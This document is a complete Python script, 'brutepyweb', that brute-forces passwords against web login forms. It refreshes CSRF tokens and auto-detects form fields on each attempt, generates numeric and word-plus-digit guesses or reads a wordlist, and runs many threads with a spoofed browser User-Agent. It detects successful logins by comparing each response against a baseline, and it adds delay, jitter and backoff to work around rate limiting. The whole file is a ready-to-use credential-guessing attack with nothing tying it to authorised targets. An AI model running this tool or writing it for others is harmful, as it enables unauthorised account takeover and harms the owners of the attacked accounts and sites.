#!/usr/bin/env python3
import argparse
from dataclasses import dataclass
import itertools
import random
import re
import secrets
import sys
import threading
from pathlib import Path
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from requests.exceptions import RequestException
from soupsieve import SelectorSyntaxError


CONNECT_TIMEOUT = 3
READ_TIMEOUT = 10
PROGRESS_INTERVAL = 0.5


class MissingCsrfTokenError(ValueError):
    pass


class LoginFormError(ValueError):
    pass


class ClassificationError(ValueError):
    pass


@dataclass(frozen=True)
class ResponseFingerprint:
    status: int
    length: int
    final_url: str
    redirects: tuple[int, ...]


@dataclass(frozen=True)
class BaselineProfile:
    statuses: frozenset[int]
    minimum_length: int
    maximum_length: int
    final_urls: frozenset[str]
    redirects: frozenset[tuple[int, ...]]


@dataclass(frozen=True)
class ResponseAssessment:
    candidate: bool
    blocked: bool
    signals: tuple[str, ...]


class CliReporter:
    def __init__(self, args, total=None, mode="unknown"):
        self.args = args
        self.total = total
        self.mode = mode
        self.start_time = None
        self.attempts = 0
        self.errors = 0
        self.hits = 0
        self.validated = 0
        self.length_changes = 0
        self.last_status = None
        self.backoff_until = 0
        self.last_progress = 0
        self.last_line_len = 0
        self.progress_active = False
        self.interactive = sys.stdout.isatty()
        self.lock = threading.RLock()

    def start(self):
        self.start_time = time.time()
        max_requests = "unlimited" if self.args.max_requests == 0 else str(self.args.max_requests)
        total = "unknown" if self.total is None else str(self.total)

        print("=" * 60)
        print("brutepyweb")
        print("=" * 60)
        print(f"[+] Url:            {self.args.url}")
        print(f"[+] Mode:           {self.mode}")
        print(f"[+] Candidates:     {total}")
        print(f"[+] Threads:        {self.args.threads}")
        print(f"[+] Delay/Jitter:   {self.args.delay:.2f}s / {self.args.jitter:.2f}s")
        print(f"[+] Timeout:        {CONNECT_TIMEOUT}s connect / {READ_TIMEOUT}s read")
        print(f"[+] Max requests:   {max_requests}")
        print("=" * 60)
        print("Starting run")

    def record_response(self, status_code):
        with self.lock:
            self.attempts += 1
            self.last_status = status_code
            self._render_progress_locked()

    def record_error(self, error, password):
        with self.lock:
            self.attempts += 1
            self.errors += 1
            self._print_event_locked(f"[-] Error: candidate={password} error={error}")

    def record_baseline(self, length, status_code):
        with self.lock:
            self._print_event_locked(f"[*] Baseline: status={status_code} length={length}")

    def record_length_change(self, password, status_code, length, base_len):
        with self.lock:
            self.length_changes += 1
            self._print_event_locked(
                f"[+] Length change: status={status_code} length={length} baseline={base_len} candidate={password}"
            )

    def record_hit(self, password, status_code, length):
        with self.lock:
            self.hits += 1
            self._print_event_locked(f"[+] Candidate: status={status_code} length={length} password={password}")

    def record_validated(self, password, status_code, length, signals):
        with self.lock:
            self.hits += 1
            self.validated += 1
            signal_text = ",".join(signals)
            self._print_event_locked(
                f"[+] Validated: status={status_code} length={length} signals={signal_text} password={password}"
            )

    def record_control(self, number, total, response):
        with self.lock:
            self._print_event_locked(
                f"[*] Invalid control {number}/{total}: status={response.status_code} "
                f"length={len(response.content)} final={response.url}"
            )

    def record_baseline_profile(self, baseline):
        with self.lock:
            statuses = ",".join(str(item) for item in sorted(baseline.statuses))
            self._print_event_locked(
                f"[*] Baseline: status={statuses} length={baseline.minimum_length}-"
                f"{baseline.maximum_length} final={len(baseline.final_urls)} route(s)"
            )

    def record_confirmation(self, accepted, signals=()):
        with self.lock:
            if accepted:
                self._print_event_locked(f"[+] Candidate confirmed: signals={','.join(signals)}")
            else:
                self._print_event_locked("[?] Differential response did not pass confirmation")

    def record_backoff(self, status_code, seconds):
        with self.lock:
            self.backoff_until = max(self.backoff_until, time.time() + seconds)
            self._print_event_locked(f"[rate] HTTP {status_code}; pausing workers for {seconds:.1f}s")

    def record_cap(self, max_requests):
        with self.lock:
            self._print_event_locked(f"[rate] Max request cap reached: {max_requests}")

    def record_get_status(self, status_code):
        with self.lock:
            self._print_event_locked(f"[*] GET returned HTTP {status_code}")

    def finish(self):
        with self.lock:
            self._clear_progress_locked()
            elapsed = self._elapsed()
            rate = self.attempts / elapsed if elapsed > 0 else 0
            print("=" * 60)
            print("Finished")
            print(f"[+] Attempts:       {self.attempts}")
            print(f"[+] Rate:           {rate:.1f} req/s")
            print(f"[+] Errors:         {self.errors}")
            print(f"[+] Length changes: {self.length_changes}")
            print(f"[+] Found:          {self.hits}")
            print(f"[+] Validated:      {self.validated}")
            print(f"[+] Elapsed:        {elapsed:.1f}s")
            print("=" * 60)

    def _elapsed(self):
        if self.start_time is None:
            return 0
        return max(time.time() - self.start_time, 0.001)

    def _progress_text_locked(self):
        elapsed = self._elapsed()
        rate = self.attempts / elapsed if elapsed > 0 else 0

        if self.total is None:
            progress = str(self.attempts)
        else:
            percent = min((self.attempts / self.total) * 100, 100) if self.total else 100
            progress = f"{self.attempts}/{self.total} ({percent:.1f}%)"

        remaining = self.backoff_until - time.time()
        status = f"backoff {remaining:.1f}s" if remaining > 0 else "running"
        last_status = "-" if self.last_status is None else str(self.last_status)
        return (
            f"Progress: {progress} | Rate: {rate:.1f}/s | "
            f"Status: {last_status} | Errors: {self.errors} | Changes: {self.length_changes} | "
            f"Found: {self.hits} | {status}"
        )

    def _render_progress_locked(self, force=False):
        if not self.interactive:
            return

        now = time.time()
        if not force and now - self.last_progress < PROGRESS_INTERVAL:
            return

        line = self._progress_text_locked()
        clear_width = max(self.last_line_len, len(line))
        sys.stdout.write("\r" + " " * clear_width + "\r" + line)
        sys.stdout.flush()
        self.last_line_len = len(line)
        self.progress_active = True
        self.last_progress = now

    def _clear_progress_locked(self):
        if not self.progress_active:
            return

        sys.stdout.write("\r" + " " * self.last_line_len + "\r")
        sys.stdout.flush()
        self.progress_active = False
        self.last_line_len = 0

    def _print_event_locked(self, message):
        self._clear_progress_locked()
        print(message)
        self._render_progress_locked(force=True)


def extract_authenticity_token(html: str, token_names=None):
    if token_names is None:
        token_names = (
            "authenticity_token",
            "csrf_token",
            "csrf",
            "_csrf",
            "_csrf_token",
            "csrfmiddlewaretoken",
            "__RequestVerificationToken",
            "request_verification_token",
            "xsrf_token",
            "_xsrf",
            "XSRF-TOKEN",
            "anti_csrf_token",
            "anti-forgery-token",
            "authenticityToken",
            "authorization_token",
            "authorization_code",
            "auth_token",
            "auth_code",
            "token",
        )

    soup = BeautifulSoup(html, "html.parser")

    for token_name in token_names:
        token_input = soup.find("input", attrs={"name": token_name})
        if token_input:
            token = token_input.get("value")
            if token:
                return token_name, token

    raise MissingCsrfTokenError("Could not find a CSRF token in the response")


def _field_value(field):
    if field.name == "textarea":
        return field.text
    if field.name == "select":
        selected = field.find("option", selected=True) or field.find("option")
        return "" if selected is None else selected.get("value", selected.text)
    return field.get("value", "on" if field.get("type", "").casefold() in {"checkbox", "radio"} else "")


def _login_form(response, args):
    soup = BeautifulSoup(response.text, "html.parser")
    selector = getattr(args, "form_selector", "")
    password_field = getattr(args, "password_field", "")

    if selector:
        try:
            form = soup.select_one(selector)
        except SelectorSyntaxError as error:
            raise LoginFormError(f"Invalid form selector: {selector}") from error
        if form is None or form.name != "form":
            raise LoginFormError(f"Form selector did not match a form: {selector}")
    else:
        password_input = (
            soup.find("input", attrs={"name": password_field})
            if password_field else soup.find("input", attrs={"type": re.compile("^password$", re.I)})
        )
        if password_input is None:
            password_input = soup.find("input", attrs={"name": "password"})
        form = password_input.find_parent("form") if password_input else None

    # Preserve legacy password-only endpoints while preferring the real HTML form.
    container = form or soup
    action = urljoin(response.url, form.get("action") if form and form.get("action") else response.url)
    if urlparse(action).scheme not in {"http", "https"}:
        raise LoginFormError(f"Unsupported login form action: {action}")
    method = (form.get("method", "get") if form else "post").casefold()
    if method not in {"get", "post"}:
        raise LoginFormError(f"Unsupported login form method: {method}")

    fields = {}
    for field in container.find_all(["input", "textarea", "select"]):
        name = field.get("name")
        field_type = field.get("type", "").casefold()
        if not name or field.has_attr("disabled"):
            continue
        if field_type in {"button", "file", "image", "reset", "submit"}:
            continue
        if field_type in {"checkbox", "radio"} and not field.has_attr("checked"):
            continue
        fields[name] = _field_value(field)

    if form:
        submit = form.find(
            lambda item: item.name in {"button", "input"}
            and item.get("name")
            and item.get("type", "submit").casefold() == "submit"
        )
        if submit:
            fields[submit["name"]] = submit.get("value", submit.text)

    if not password_field:
        password_input = container.find("input", attrs={"type": re.compile("^password$", re.I)})
        password_field = password_input.get("name", "") if password_input else "password"
    if not password_field:
        raise LoginFormError("The selected login form has no named password input")

    username = getattr(args, "username", "")
    username_field = getattr(args, "username_field", "")
    if username and not username_field:
        username_input = container.find(
            "input", attrs={"autocomplete": re.compile("username", re.I)}
        )
        if username_input is None:
            username_input = container.find(
                "input", attrs={"name": re.compile(
                    r"^(user(name)?|login|email|identifier|account)$", re.I
                )}
            )
        if username_input is None:
            username_input = container.find("input", attrs={"type": re.compile("^(email|text)$", re.I)})
        username_field = username_input.get("name", "") if username_input else ""
    if username and not username_field:
        raise LoginFormError("Could not detect the username field; pass --username-field")

    return action, method, fields, password_field, username_field


def send_requests(url: str, password, reporter, args=None):
    if args is None:
        args = argparse.Namespace(
            form_selector="", password_field="", username="", username_field=""
        )
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        "Accept": "*/*",
    })
    response = session.get(url, allow_redirects=True, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT))
    if response.status_code not in (200, 401, 403):
        response.raise_for_status()
        reporter.record_get_status(response.status_code)
    action, method, post_data, password_field, username_field = _login_form(response, args)
    post_data[password_field] = password
    if username_field:
        post_data[username_field] = args.username
    page_url = urlparse(response.url)
    headers = {
        "Referer": response.url,
        "Origin": f"{page_url.scheme}://{page_url.netloc}",
    }
    request_arguments = {
        "headers": headers,
        "timeout": (CONNECT_TIMEOUT, READ_TIMEOUT),
        "allow_redirects": True,
    }
    request_arguments["params" if method == "get" else "data"] = post_data
    post_response = session.request(method, action, **request_arguments)
    post_response._brutepyweb_cookie_names = tuple(session.cookies.keys())
    return post_response


def response_fingerprint(response):
    return ResponseFingerprint(
        status=response.status_code,
        length=len(response.content),
        final_url=response.url,
        redirects=tuple(item.status_code for item in response.history),
    )


def make_baseline(responses):
    fingerprints = [response_fingerprint(response) for response in responses]
    return BaselineProfile(
        statuses=frozenset(item.status for item in fingerprints),
        minimum_length=min(item.length for item in fingerprints),
        maximum_length=max(item.length for item in fingerprints),
        final_urls=frozenset(item.final_url for item in fingerprints),
        redirects=frozenset(item.redirects for item in fingerprints),
    )


def _matches(pattern, value):
    return bool(pattern and re.search(pattern, value, re.I))


def assess_response(response, baseline, args):
    fingerprint = response_fingerprint(response)
    signals = []
    success_regex = getattr(args, "success_regex", "")
    failure_regex = getattr(args, "failure_regex", "")
    success_url_regex = getattr(args, "success_url_regex", "")
    success_cookie = getattr(args, "success_cookie", "")

    if _matches(success_regex, response.text):
        signals.append("success-content")
    if _matches(success_url_regex, fingerprint.final_url):
        signals.append("success-url")
    if success_cookie and success_cookie.casefold() in {
        item.casefold() for item in getattr(
            response, "_brutepyweb_cookie_names", response.cookies.keys()
        )
    }:
        signals.append("success-cookie")
    if not signals and _matches(failure_regex, response.text):
        return ResponseAssessment(False, False, ())

    if fingerprint.status not in baseline.statuses:
        signals.append("status")
    tolerance = getattr(args, "length_tolerance", 0)
    if not (
        baseline.minimum_length - tolerance
        <= fingerprint.length
        <= baseline.maximum_length + tolerance
    ):
        signals.append("length")
    if fingerprint.final_url not in baseline.final_urls:
        signals.append("final-url")
    if fingerprint.redirects not in baseline.redirects:
        signals.append("redirects")

    blocked = response.status_code in {429, 503} or bool(response.headers.get("Retry-After"))
    return ResponseAssessment(bool(signals) and not blocked, blocked, tuple(dict.fromkeys(signals)))


def inspect_response_length(response, password, base_len, reporter):
    r_len = len(response.content)
    if base_len is None:
        reporter.record_baseline(r_len, response.status_code)
        return r_len
    elif r_len != base_len:
        reporter.record_length_change(password, response.status_code, r_len, base_len)

    return base_len


def request_delay(args):
    seconds = args.delay
    if args.jitter:
        seconds += random.uniform(0, args.jitter)
    if seconds > 0:
        time.sleep(seconds)


class RunState:
    def __init__(self, args, reporter):
        self.args = args
        self.reporter = reporter
        self.request_count = 0
        self.pause_until = 0
        self.current_backoff = args.backoff
        self.cap_printed = False
        self.stop_event = threading.Event()
        self.request_count_lock = threading.Lock()
        self.backoff_lock = threading.Lock()
        self.validation_lock = threading.Lock()

    def reserve_request(self):
        with self.request_count_lock:
            if self.args.max_requests != 0 and self.request_count >= self.args.max_requests:
                if not self.cap_printed:
                    self.reporter.record_cap(self.args.max_requests)
                    self.cap_printed = True
                self.stop_event.set()
                return False

            self.request_count += 1
            return True

    def wait_for_backoff(self):
        while not self.stop_event.is_set():
            with self.backoff_lock:
                remaining = self.pause_until - time.time()

            if remaining <= 0:
                return

            time.sleep(min(remaining, 1.0))

    def wait_before_request(self):
        self.wait_for_backoff()
        request_delay(self.args)
        self.wait_for_backoff()

    def handle_backoff(self, response):
        if response.status_code not in (429, 500, 503) and not response.headers.get("Retry-After"):
            return

        retry_after = response.headers.get("Retry-After")
        backoff_seconds = self.current_backoff
        if retry_after:
            try:
                backoff_seconds = float(retry_after)
            except ValueError:
                backoff_seconds = self.current_backoff

        backoff_seconds = min(backoff_seconds, self.args.max_backoff)
        with self.backoff_lock:
            self.pause_until = max(self.pause_until, time.time() + backoff_seconds)
            self.current_backoff = min(self.current_backoff * self.args.backoff_multiplier, self.args.max_backoff)

        self.reporter.record_backoff(response.status_code, backoff_seconds)


def next_password(password_iter, password_iter_lock):
    with password_iter_lock:
        try:
            return next(password_iter)
        except StopIteration:
            return None


def effective_total(candidate_total, args):
    if args.max_requests == 0:
        return candidate_total
    if candidate_total is None:
        return args.max_requests
    return min(candidate_total, args.max_requests)


def _invalid_password(example, configured=""):
    if configured:
        return configured
    alphabet = {
        "lower": "abcdefghijklmnopqrstuvwxyz",
        "upper": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "digit": "0123456789",
        "other": "!@#$%^&*_-+=",
    }
    generated = []
    for character in example or "password":
        kind = (
            "lower" if character.islower() else
            "upper" if character.isupper() else
            "digit" if character.isdigit() else "other"
        )
        generated.append(secrets.choice(alphabet[kind]))
    result = "".join(generated)
    if result == example and result:
        replacement = alphabet["digit"] if result[-1].isdigit() else alphabet["lower"]
        result = result[:-1] + next(item for item in replacement if item != result[-1])
    return result


def build_baseline(url, example, args, reporter):
    responses = []
    for number in range(1, args.baseline_requests + 1):
        request_delay(args)
        response = send_requests(
            url, _invalid_password(example, args.invalid_password), reporter, args
        )
        if response.status_code >= 500 or response.headers.get("Retry-After"):
            raise ClassificationError(
                f"Invalid baseline control returned HTTP {response.status_code}; cannot classify safely"
            )
        responses.append(response)
        reporter.record_control(number, args.baseline_requests, response)
    baseline = make_baseline(responses)
    reporter.record_baseline_profile(baseline)
    return baseline


def confirm_candidate(url, password, initial_assessment, baseline, args, reporter):
    common_signals = set(initial_assessment.signals)
    for _ in range(args.confirm_requests):
        request_delay(args)
        response = send_requests(url, password, reporter, args)
        assessment = assess_response(response, baseline, args)
        if not assessment.candidate or assessment.blocked:
            reporter.record_confirmation(False)
            return False, (), response
        common_signals.intersection_update(assessment.signals)

    control_password = _invalid_password(password, args.invalid_password)
    if control_password == password:
        raise ClassificationError("--invalid-password must differ from every tested candidate")
    request_delay(args)
    control = send_requests(url, control_password, reporter, args)
    control_assessment = assess_response(control, baseline, args)
    if control_assessment.candidate or control_assessment.blocked or not common_signals:
        reporter.record_confirmation(False)
        return False, (), control

    signals = tuple(sorted(common_signals))
    reporter.record_confirmation(True, signals)
    return True, signals, response


def run_passwords(passwords, url, args, total=None, mode="unknown"):
    reporter = CliReporter(args, effective_total(total, args), mode)
    state = RunState(args, reporter)
    password_iter = iter(passwords)
    first_password = next(password_iter, None)
    if first_password is None:
        raise ValueError("No password candidates were provided")
    password_iter = itertools.chain((first_password,), password_iter)
    password_iter_lock = threading.Lock()
    baseline = None

    def worker():
        while not state.stop_event.is_set():
            password = next_password(password_iter, password_iter_lock)
            if password is None:
                return

            state.wait_before_request()
            if state.stop_event.is_set():
                return

            if not state.reserve_request():
                return

            try:
                bong = send_requests(url, password, reporter, args)
                reporter.record_response(bong.status_code)
                state.handle_backoff(bong)
                assessment = assess_response(bong, baseline, args)
                if "length" in assessment.signals:
                    reporter.record_length_change(
                        password, bong.status_code, len(bong.content),
                        f"{baseline.minimum_length}-{baseline.maximum_length}",
                    )
                if not assessment.candidate:
                    continue
                with state.validation_lock:
                    if state.stop_event.is_set():
                        return
                    accepted, signals, confirmed_response = confirm_candidate(
                        url, password, assessment, baseline, args, reporter
                    )
                    if accepted:
                        reporter.record_validated(
                            password, confirmed_response.status_code,
                            len(confirmed_response.content), signals,
                        )
                        state.stop_event.set()
                        return
                    reporter.record_hit(password, bong.status_code, len(bong.content))
            except RequestException as e:
                reporter.record_error(e, password)
                time.sleep(3.0)
            except (LoginFormError, ClassificationError) as e:
                reporter.record_error(e, password)
                state.stop_event.set()
                return

    reporter.start()
    try:
        baseline = build_baseline(url, first_password, args, reporter)
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = [executor.submit(worker) for _ in range(args.threads)]
            for future in futures:
                future.result()
    finally:
        reporter.finish()


def read_password_from_file(path: Path):
    with path.open("r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]

    if not passwords:
        raise ValueError("Password file contained no usable password.")

    return passwords

def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Test password candidates against an HTML login form with fresh CSRF state."
    )
    parser.add_argument("-u", "--url", required=True, help="Target login page URL.")
    parser.add_argument("--username", default="", help="Username or identity submitted with each candidate.")
    parser.add_argument("--username-field", default="", help="Override the detected username field name.")
    parser.add_argument("--password-field", default="", help="Override the detected password field name.")
    parser.add_argument("--form-selector", default="", help="CSS selector for the login form.")
    parser.add_argument("--success-regex", default="", help="Response-body regex proving successful authentication.")
    parser.add_argument("--failure-regex", default="", help="Response-body regex identifying a rejected login.")
    parser.add_argument("--success-url-regex", default="", help="Final-URL regex proving successful authentication.")
    parser.add_argument("--success-cookie", default="", help="Response cookie name proving successful authentication.")
    parser.add_argument("--length-tolerance", type=int, default=0, help="Allowed invalid-response size variation.")
    parser.add_argument("--baseline-requests", type=int, default=3, help="Known-invalid controls used for the baseline.")
    parser.add_argument("--confirm-requests", type=int, default=2, help="Fresh-session repetitions required for validation.")
    parser.add_argument("--invalid-password", default="", help="Known-invalid control; defaults to a same-shape generated value.")
    parser.add_argument("-w", "--word", type=str, help="add a word preceeding numbers when using -d/--digits")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Number of worker threads.")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay before each request.")
    parser.add_argument("-j", "--jitter", type=float, default=0.0, help="Random additional delay before each request.")
    parser.add_argument("--max-requests", type=int, default=0, help="Maximum requests before stopping. Use 0 for unlimited.")
    parser.add_argument("-b", "--backoff", type=float, default=10.0, help="Backoff seconds for HTTP 429, 500, and 503.")
    parser.add_argument("--backoff-multiplier", type=float, default=2.0, help="Multiplier for repeated backoff triggers.")
    parser.add_argument("--max-backoff", type=float, default=120.0, help="Maximum backoff seconds.")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-p", "--password-file", type=Path, help="File containing password.")
    group.add_argument("-d", "--digits", type=int, help="Generate numeric password with this many digits.")
    
    args = parser.parse_args(argv)

    if args.word is not None and args.digits is None:
        parser.error("-d/--digits is required when using -w/--word")
    if args.threads < 1:
        parser.error("--threads must be at least 1")
    if args.delay < 0:
        parser.error("--delay must be 0 or greater")
    if args.jitter < 0:
        parser.error("--jitter must be 0 or greater")
    if args.max_requests < 0:
        parser.error("--max-requests must be 0 or greater")
    if args.backoff < 0:
        parser.error("--backoff must be 0 or greater")
    if args.backoff_multiplier < 1:
        parser.error("--backoff-multiplier must be at least 1")
    if args.max_backoff < 0:
        parser.error("--max-backoff must be 0 or greater")
    if args.digits is not None and args.digits < 1:
        parser.error("-d/--digits must be 1 or greater")
    if args.length_tolerance < 0:
        parser.error("--length-tolerance must be 0 or greater")
    if not 2 <= args.baseline_requests <= 10:
        parser.error("--baseline-requests must be from 2 to 10")
    if not 1 <= args.confirm_requests <= 5:
        parser.error("--confirm-requests must be from 1 to 5")
    for option, pattern in (
        ("--success-regex", args.success_regex),
        ("--failure-regex", args.failure_regex),
        ("--success-url-regex", args.success_url_regex),
    ):
        try:
            re.compile(pattern)
        except re.error as error:
            parser.error(f"{option} is not a valid regex: {error}")

    try:
        if args.password_file:
            password = read_password_from_file(args.password_file)
            loop_files(password, args.url, args)
        elif args.word and args.digits is not None:
            num_length = len(str(args.digits))
            number = args.digits
            loop_words(number, args.url, args.word, num_length, args)
        elif args.digits is not None and not args.word:
            num_length = len(str(args.digits))
            number = args.digits
            loop_digits(number, args.url, num_length, args)
    except (RequestException, LoginFormError, ClassificationError, OSError, ValueError) as error:
        print(f"[-] Fatal: {error}", file=sys.stderr)
        return 2
    
    return 0

def loop_files(passwords: list, url, args):
    run_passwords(passwords, url, args, total=len(passwords), mode=f"file ({args.password_file})")

def loop_digits(numbers: int, url, num_length, args):
    passwords = (f"{i:0{num_length}}" for i in range(1, numbers+1))
    run_passwords(passwords, url, args, total=numbers, mode=f"digits (1-{numbers})")

def loop_words(numbers: int, url, keyword: str, num_length, args):
    passwords = (f"{keyword}{i:0{num_length}}" for i in range(1, numbers+1))
    run_passwords(passwords, url, args, total=numbers, mode=f"word+digits ({keyword}1-{keyword}{numbers})")


if __name__ == "__main__":
    sys.exit(main())
